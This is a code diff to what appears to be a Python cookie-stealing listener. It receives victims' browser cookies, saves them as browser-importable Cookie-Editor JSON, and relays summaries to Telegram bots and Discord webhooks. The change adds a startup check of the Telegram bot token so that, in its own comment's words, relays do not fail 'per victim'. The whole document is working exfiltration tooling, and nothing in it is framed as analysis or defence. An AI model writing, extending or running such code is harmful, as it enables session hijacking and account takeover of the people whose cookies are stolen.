@@ -20,7 +20,7 @@ Relay options (re-send received cookies to a second channel):
   --discord <webhook_url>            Forward summary to Discord webhook
   --email <addr>                     (future) Forward via email
 """
-import json, os, sys, time, socket, socketserver, threading, urllib.request, urllib.parse
+import json, os, sys, time, socket, socketserver, threading, urllib.error, urllib.request, urllib.parse
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
@@ -131,6 +131,36 @@ def merge(old, new):
 
 
 # ------------------------------------------------------------------ relay channels
+
+def telegram_preflight(token):
+    """getMe once at startup. A revoked/placeholder key is dropped here instead of
+    failing a POST per victim into a console nobody watches."""
+    if not token:
+        return None
+    if ":" not in token:
+        print("[-] telegram: expected bot_token:chat_id -- relay disabled")
+        return None
+    bot = token.rsplit(":", 1)[0]
+    try:
+        with urllib.request.urlopen("https://api.telegram.org/bot%s/getMe" % bot, timeout=8) as r:
+            data = json.loads(r.read().decode("utf-8", "replace"))
+        if data.get("ok"):
+            print("[listen] relay: Telegram @%s" % ((data.get("result") or {}).get("username") or "bot"))
+            return token
+        print("[-] telegram: %s -- relay disabled" % (data.get("description") or "not ok"))
+        return None
+    except urllib.error.HTTPError as ex:
+        body = ""
+        try:
+            body = json.loads(ex.read().decode("utf-8", "replace")).get("description", "")
+        except Exception:
+            pass
+        print("[-] telegram: %s (HTTP %d) -- relay disabled" % (body or "rejected", ex.code))
+        return None
+    except Exception as ex:
+        print("[!] telegram: could not verify (%s) -- relay kept" % ex.__class__.__name__)
+        return token
+
 
 def relay_telegram(cookies):
     """Forward a summary of received cookies to Telegram Bot API."""
@@ -431,8 +461,8 @@ def main():
     except Exception:
         pass
     print("[listen] format: Cookie-Editor JSON (browser-importable)")
-    if TELEGRAM:
-        print("[listen] relay: Telegram -> %s" % TELEGRAM.split(":")[0][:10] + "...")
+    global TELEGRAM
+    TELEGRAM = telegram_preflight(TELEGRAM)
     if DISCORD:
         print("[listen] relay: Discord -> %s" % (DISCORD.split("/api/")[0] if "/api/" in DISCORD else DISCORD[:30]))
     server = HTTPServerV4(("0.0.0.0", PORT), Handler)
